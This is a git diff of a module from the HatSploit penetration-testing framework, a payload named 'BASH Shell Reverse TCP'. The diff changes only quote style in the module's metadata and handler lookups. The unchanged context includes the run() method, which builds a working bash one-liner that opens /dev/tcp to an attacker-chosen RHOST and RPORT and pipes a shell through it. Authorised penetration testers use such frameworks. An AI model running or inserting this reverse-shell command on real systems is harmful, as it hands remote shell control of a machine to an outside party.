@@ -10,19 +10,19 @@ from hatsploit.lib.payload import Payload
 
 class HatSploitPayload(Payload):
     details = {
-        'Name': "BASH Shell Reverse TCP",
-        'Payload': "unix/generic/bash_reverse_tcp",
-        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
-        'Description': "BASH shell reverse TCP payload.",
-        'Architecture': "generic",
-        'Platform': "unix",
-        'Rank': "high",
-        'Type': "reverse_tcp",
+        "Name": "BASH Shell Reverse TCP",
+        "Payload": "unix/generic/bash_reverse_tcp",
+        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
+        "Description": "BASH shell reverse TCP payload.",
+        "Architecture": "generic",
+        "Platform": "unix",
+        "Rank": "high",
+        "Type": "reverse_tcp",
     }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
+        remote_host = self.handler["RHOST"]
+        remote_port = self.handler["RPORT"]
 
         fd = random.randint(0, 200)
         payload = f"bash -c '0<&{fd}-;exec {fd}<>/dev/tcp/{remote_host}/{remote_port};sh <&{fd} >&{fd} 2>&{fd}' &"
